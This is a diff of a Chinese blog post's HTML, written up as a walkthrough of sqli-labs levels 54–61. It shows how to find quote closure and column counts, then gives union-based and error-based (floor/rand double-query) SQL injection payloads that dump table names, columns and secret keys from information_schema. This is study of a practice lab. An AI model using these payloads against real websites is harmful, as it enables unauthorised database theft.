@@ -154,47 +154,60 @@
       detectApple()
     })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">133</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/1.png')"><nav id="nav"><span id="blog-info"><a href="/" title="senu11"><span class="site-name">senu11</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">sql-labs记录3</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2019-12-31T16:34:00.000Z" title="发表于 2020-01-01 00:34:00">2020-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="sql-labs记录3"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>本文记录sqli-labs第54-65关，也算是踩了很多坑吧</p>
 <span id="more"></span>
+
 <h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-判断闭合"><a href="#1-判断闭合" class="headerlink" title="1.判断闭合"></a>1.判断闭合</h3><p>之前判断闭合直接是上符号再闭合进行判断，这样是不对的，容易出错，应该采用以下方式:来源于Y4tacker</p>
 <p>判断闭合方式，目前常用的闭合方式为单引号’’，单引号括号(’’)，双引号””，双引号括号(“”)</p>
 <h4 id="1-常规判断方法"><a href="#1-常规判断方法" class="headerlink" title="1.常规判断方法"></a>1.常规判断方法</h4><p>1.首先尝试：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>’</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>”</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li>如果都报错，则为整形闭合。</li>
 </ul>
 <p>2.如果单引号报错，双引号不报错。然后尝试</p>
 <ul>
-<li><p>```sql<br>?id=1’ —+<br>?id=1’ #  </p>
+<li><pre><code class="sql">?id=1&#39; --+
+?id=1&#39; #  
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ 无报错则单引号闭合。报错则单引号加括号。</span><br><span class="line"></span><br><span class="line">3.如果单引号不报错，双引号报错。然后尝试</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">?id=1&quot; --+</span><br><span class="line">?id=1&quot; #</span><br></pre></td></tr></table></figure>
+</code></pre>
 </li>
 <li><p>无报错则双引号闭合。报错则双引号加括号。</p>
 </li>
 </ul>
-<h4 id="2-真假值判断"><a href="#2-真假值判断" class="headerlink" title="2.真假值判断"></a>2.真假值判断</h4><p>1.输入（其中id=1,1是正确的数据库存在的值），正常回显</p>
+<h4 id="2-真假值判断"><a href="#2-真假值判断" class="headerlink" title="2.真假值判断"></a>2.真假值判断</h4><p>1.输入（其中id&#x3D;1,1是正确的数据库存在的值），正常回显</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="literal">true</span> <span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?id<span class="operator">=</span><span class="literal">true</span> <span class="keyword">and</span> <span class="literal">true</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p>输入，错误回显</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="literal">false</span> <span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?id<span class="operator">=</span><span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p>那么就是整形闭合</p>
-<p>2.输入（其中id=1,1是正确的数据库存在的值），正常回显</p>
+<p>2.输入（其中id&#x3D;1,1是正确的数据库存在的值），正常回显</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> <span class="literal">true</span> <span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?id<span class="operator">=</span><span class="literal">true</span>‘ <span class="keyword">and</span> <span class="literal">true</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p>输入，错误回显</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">and</span> <span class="literal">false</span> <span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?id<span class="operator">=</span><span class="literal">true</span>‘ <span class="keyword">and</span> <span class="literal">false</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
 <p>那么就是单引号闭合，其他符号同理</p>
 <h4 id="3-order-by闭合方式判断"><a href="#3-order-by闭合方式判断" class="headerlink" title="3.order by闭合方式判断()"></a>3.order by闭合方式判断()</h4><p>是否存在注入，若结果不同，就是存在注入，可以往下进行，若结果相同，判断是否为字符注入</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">desc</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">asc</span></span><br></pre></td></tr></table></figure>
+
 <p>是否为数字注入，显示结果不同，则为数字注入，相同，则往下进行</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="keyword">right</span>(version(),<span class="number">1</span>)</span><br><span class="line">?sort<span class="operator">=</span><span class="keyword">left</span>(version(),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
 <p>是否为布尔类型，此时我们可以用报错注入和延时注入</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>rand(<span class="literal">true</span>)</span><br><span class="line">?sort<span class="operator">=</span>rand(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
+
 <p>是否为字符注入，回显结果不一样，就说明闭合方式为单引号，其他闭合方式（双引号，单引号括号，双引号括号）同理</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2.判断字段数"></a>2.判断字段数</h3><p>按照惯性思维，一般都是order by进行判断，但有时候不一定会成功，就应该考虑其他方式了。</p>
 <h4 id="1-order-by"><a href="#1-order-by" class="headerlink" title="1.order by"></a>1.order by</h4><p>语法：<code>?id=1&#39; order by 1,2,3--+</code></p>
 <h4 id="2-union-select"><a href="#2-union-select" class="headerlink" title="2.union select"></a>2.union select</h4><p>语法：<code>?id=1&#39; union select 1,2,3--+</code></p>
-<p>在这里要说一点就是括号的优先级大于单双引号，如果我们遇到 字符型带括号类型注入，如字符型单引号小括号，如果我们在url中输入?id=1)—+ ?id=1”)—+ 由于优先级的问题页面是会返回正常，但后台数据库并没有成功的进行闭合，使用union注入后都无法成功进行注入。</p>
+<p>在这里要说一点就是括号的优先级大于单双引号，如果我们遇到 字符型带括号类型注入，如字符型单引号小括号，如果我们在url中输入?id&#x3D;1)–+ ?id&#x3D;1”)–+ 由于优先级的问题页面是会返回正常，但后台数据库并没有成功的进行闭合，使用union注入后都无法成功进行注入。</p>
 <h2 id="2-靶场记录"><a href="#2-靶场记录" class="headerlink" title="2.靶场记录"></a>2.靶场记录</h2><h3 id="Less54：GET-union查询-每轮允许10次"><a href="#Less54：GET-union查询-每轮允许10次" class="headerlink" title="Less54：GET-union查询-每轮允许10次"></a>Less54：GET-union查询-每轮允许10次</h3><blockquote>
 <table bgcolor="#7FFFD4">题目要求：The objective of this challenge is to dump the (secret key) from only random table from Database ('CHALLENGES') in Less than 10 attempts. For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.</table>
 <table bgcolor="#7FFFD4">意思就是此挑战的目标是在不到10次的尝试中从数据库（challenges）的随机表中转储（密钥）。超过10此就会重置，每次都会生成随机表名、列名和表数据。</table>
-
 </blockquote>
 <p> 第一关先按正常步骤来，后面的直接贴关键的了</p>
 <p>1.找闭合，单引号闭合</p>
@@ -219,15 +232,19 @@
 <p><img src="image-20210222142251627.png" alt="image-20210222142251627"></p>
 <h3 id="Less55：GET-union查询-每轮允许14次-1"><a href="#Less55：GET-union查询-每轮允许14次-1" class="headerlink" title="Less55：GET-union查询-每轮允许14次-1"></a>Less55：GET-union查询-每轮允许14次-1</h3><p>判断闭合</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id=1                正确回显</span><br><span class="line">?id=1&#x27;      无错误异常回显</span><br><span class="line">?id=1&quot;      无错误异常回显		#是数字型所以单双引号都会报错</span><br><span class="line">?id=1&#x27;)--+   无错误异常回显	#要注意的是这里使用union注入发现单单一个数字型无法注入成功的时候就要考虑是否含有小括号</span><br><span class="line">?id=1&quot;)--+   无错误异常回显</span><br><span class="line">?id=1)--+    正确回显</span><br></pre></td></tr></table></figure>
+
 <p>除了闭合不一样，其余都和54关一样</p>
 <h3 id="Less56：GET-union查询-每轮允许14次-2"><a href="#Less56：GET-union查询-每轮允许14次-2" class="headerlink" title="Less56：GET-union查询-每轮允许14次-2"></a>Less56：GET-union查询-每轮允许14次-2</h3><p>判断回显</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1          正确回显</span><br><span class="line">?id=1&quot;          正确回显</span><br><span class="line">?id=1&#x27;          无错误异常回显</span><br><span class="line">?id=1&#x27;--+      无错误异常回显</span><br><span class="line">?id=1&#x27;)--+    正常回显</span><br><span class="line"></span><br><span class="line">格外说明：（这种情况只出现在字符型注入中，造成这样的原因是括号的优先级高。如果是数字型带括号下面的语句会直接报错的，）</span><br><span class="line">?id=1)--+     虽然正确回显,但是后台数据库并没有闭合成功，无法进行注入</span><br><span class="line">?id=1&quot;)--+   虽然正确回显，但是后台数据库并没有闭合成功，无法进行注入</span><br></pre></td></tr></table></figure>
+
 <p>其他都一样</p>
 <h3 id="Less57：GET-union查询-每轮允许14次-3"><a href="#Less57：GET-union查询-每轮允许14次-3" class="headerlink" title="Less57：GET-union查询-每轮允许14次-3"></a>Less57：GET-union查询-每轮允许14次-3</h3><p>判断闭合</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;				正确回显</span><br><span class="line">?id=1&quot;				异常回显</span><br><span class="line">?id=1&quot;				异常回显</span><br><span class="line">?id=1&quot;--+			异常回显</span><br><span class="line">?id=1&quot;)--+			正常回显				</span><br></pre></td></tr></table></figure>
+
 <p>其他都一样。</p>
 <h3 id="Less58：GET-双查询-每轮允许5次-1"><a href="#Less58：GET-双查询-每轮允许5次-1" class="headerlink" title="Less58：GET-双查询-每轮允许5次-1"></a>Less58：GET-双查询-每轮允许5次-1</h3><p>判断闭合</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;			异常回显</span><br><span class="line">?id=1&quot;			正常回显</span><br><span class="line">?id=1&#x27; -- #		正常回显</span><br></pre></td></tr></table></figure>
+
 <p>这一关无法使用union查询，看图</p>
 <p><img src="image-20210222235011326.png" alt="image-20210222235011326"><img src="image-20210222235043270.png" alt="image-20210222235043270"></p>
 <p><img src="image-20210222235600326.png" alt="image-20210222235600326" style="zoom: 67%;"><img src="image-20210222235625583.png" alt="image-20210222235625583" style="zoom:80%;"></p>
@@ -235,6 +252,9 @@
 <p> 使用group_concat()函数进行双注入报错</p>
 <p>payload</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">表</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;),floor(rand()*2)) as a from information_schema.tables group by a--+</span></span><br><span class="line"><span class="string">字段</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat_ws(<span class="string">&#x27;-&#x27;</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;challenges&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br><span class="line">信息</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat_ws(&#x27;</span><span class="operator">-</span><span class="string">&#x27;,(select 字段名 from challenges.表),floor(rand()*2)) as a from information_schema.tables group by a--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+
 <h3 id="Less59：GET-双查询-每轮允许5次-2"><a href="#Less59：GET-双查询-每轮允许5次-2" class="headerlink" title="Less59：GET-双查询-每轮允许5次-2"></a>Less59：GET-双查询-每轮允许5次-2</h3><p>为数字型注入，同58类似</p>
 <h3 id="Less60：GET-双查询-每轮允许5次-3"><a href="#Less60：GET-双查询-每轮允许5次-3" class="headerlink" title="Less60：GET-双查询-每轮允许5次-3"></a>Less60：GET-双查询-每轮允许5次-3</h3><p>带括号的双引号字符型注入，参考58</p>
 <h3 id="Less61：GET-双查询-每轮允许5次-4"><a href="#Less61：GET-双查询-每轮允许5次-4" class="headerlink" title="Less61：GET-双查询-每轮允许5次-4"></a>Less61：GET-双查询-每轮允许5次-4</h3><p>带两个小括号的单引号字符型，参考58</p>
